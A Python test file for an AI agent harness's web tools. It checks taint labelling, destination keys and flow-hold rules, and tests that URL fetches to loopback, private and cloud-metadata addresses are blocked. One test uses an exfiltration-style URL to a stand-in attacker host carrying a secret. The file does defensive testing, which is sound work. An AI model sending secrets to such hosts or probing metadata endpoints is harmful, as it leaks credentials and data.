"""FG2 XS-4, XS-7, WB-1, WB-2, WB-4, ME-2: the product's web tools are reads whose request leaves the organization, and
what they return is public content to the taint ledger. The flow rule never holds them (``flow_holds``)."""

from __future__ import annotations

import json

import pytest

from app.harness.flow_destination import pipeshub_destination
from app.harness.labels import SessionSourceLedger, own_work_label, tool_kind
from harness_core.effects.flow import (
    destination_key,
    external_write,
    flow_holds,
    sends_out,
)
from harness_core.kernel.core.messages import ToolCall
from harness_core.kernel.durable.effects import classify_tool_effect
from harness_core.testing.contracts.source_ledger import Stream
from tests.support.web_tools import product_web_tools
from tests.unit.harness.engines.test_source_ledger import PipesHubLedgerWorld

RUN = "run-1"
WEB = ("dynamic__web_search", "dynamic__fetch_url")


@pytest.mark.parametrize("name", WEB)
def test_xs4_the_product_web_tools_are_reads_that_send_out(name: str) -> None:
    tool = product_web_tools()[name]
    effect = classify_tool_effect(tool.name, tool.tags)
    assert (effect.effect, effect.sink.egress, effect.sink.args_leave_boundary) == ("read", "external", True)
    assert sends_out(effect) and not external_write(effect) and not flow_holds(effect)


def _fetch(url: str) -> ToolCall:
    return ToolCall(id="c", name="dynamic__fetch_url", arguments={"url": url})


def test_xs7_the_card_names_the_site_and_a_grant_holds_for_it() -> None:
    tool = product_web_tools()["dynamic__fetch_url"]
    effect = classify_tool_effect(tool.name, tool.tags)
    page = pipeshub_destination(_fetch("https://docs.example.com/guide?q=1"), effect)
    other_page = pipeshub_destination(_fetch("https://DOCS.example.com/other"), effect)
    elsewhere = pipeshub_destination(_fetch("https://attacker.test/x?c=secret"), effect)
    assert page is not None and other_page is not None and elsewhere is not None
    assert page.label == "example.com"
    assert page.key == other_page.key == destination_key(effect.tool_id, "url=example.com")
    assert elsewhere.key != page.key
    assert pipeshub_destination(_fetch("not a url"), effect) is None


@pytest.mark.parametrize("name", [*WEB, "pipeshub@web/dynamic__fetch_url"])
def test_wb1_web_results_are_public(name: str) -> None:
    assert tool_kind(name) == "public"


def test_wb1_a_connector_read_stays_opaque() -> None:
    assert tool_kind("jira__get_issue") == "opaque"


def test_wb2_a_run_that_only_browsed_read_nothing_private() -> None:
    world, stream = PipesHubLedgerWorld(), Stream()
    stream.admitted(RUN)
    world.browsed(stream, RUN, "inv-1")
    world.browsed(stream, RUN, "inv-2")
    label = own_work_label(stream.events, RUN, tool_names={"pipeshub@web/dynamic__fetch_url": "dynamic__fetch_url"})
    assert (label.complete, label.sources) == (True, frozenset())
    world.ledger.apply(stream.events)
    assert world.ledger.source_records(RUN) == frozenset()


def test_wb2_browsing_beside_a_record_or_a_connector_keeps_their_sensitivity() -> None:
    world, stream = PipesHubLedgerWorld(), Stream()
    stream.admitted(RUN)
    world.browsed(stream, RUN, "inv-1")
    world.recorded(stream, RUN, "inv-2", ["rec-1"])
    world.ledger.apply(stream.events)
    assert world.ledger.source_records(RUN) == frozenset({"rec-1"})
    world.unrecorded(stream, RUN, "inv-3")
    fresh = SessionSourceLedger(tool_names=dict(vars(world.ledger)["_tool_names"]))
    fresh.apply(stream.events)
    assert fresh.source_records(RUN) is None


@pytest.mark.parametrize(
    "url", ["http://127.0.0.1/", "http://10.0.0.5/admin", "http://169.254.169.254/latest/meta-data/", "http://[::1]/"]
)
async def test_wb4_fetch_url_reaches_only_public_addresses(url: str, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("PIPESHUB_BLOCK_PRIVATE_ADDRESSES", raising=False)
    tool = product_web_tools()["dynamic__fetch_url"]
    output = await tool.execute(url=url)
    assert output.success is False and output.error is not None
    assert json.loads(output.error)["error"].startswith("Blocked unsafe URL address")


def test_me2_the_flow_rule_may_hold_the_catalogs_external_writes_and_never_its_two_web_reads() -> None:
    from tests.unit.harness.test_effect_tags_complete import ENUMERATORS

    catalog = {t.name: classify_tool_effect(t.name, t.tags) for enumerate_ in ENUMERATORS.values() for t in enumerate_()}
    writes = {name for name, e in catalog.items() if external_write(e)}
    sent = {name for name, e in catalog.items() if sends_out(e)}
    held = {name for name, e in catalog.items() if flow_holds(e)}
    print(f"\nFG2-ME2 tools={len(catalog)} external_writes={len(writes)} may_hold={len(held)} reads={sorted(sent - writes)}")
    assert sent - writes == set(WEB)
    assert held == writes
    assert len(writes) == 145  # 133 (SINK1), main's 8 docs and sheets writes (#4221), its 4 add_attachments writes
